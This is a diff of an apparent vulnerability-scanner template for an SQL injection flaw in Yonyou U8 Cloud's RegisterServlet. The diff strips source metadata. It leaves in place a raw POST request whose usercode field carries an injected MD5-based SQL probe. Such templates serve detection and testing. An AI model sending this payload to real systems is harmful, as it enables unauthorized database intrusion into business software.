@@ -3,12 +3,8 @@ info:
   name: 用友u8-cloud RegisterServlet SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tys9ztm2zti0awr5'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tys9ztm2zti0awr5
-    fofa: 暂无
 http:
 - raw:
   - 'POST /servlet/RegisterServlet HTTP/1.1
@@ -30,8 +26,6 @@ http:
 
 
     Accept-Encoding: gzip
-
-
 
 
     usercode=1'' and substring(sys.fn_sqlvarbasetostr(HashBytes(''MD5'',''123456'')),3,32)>0--
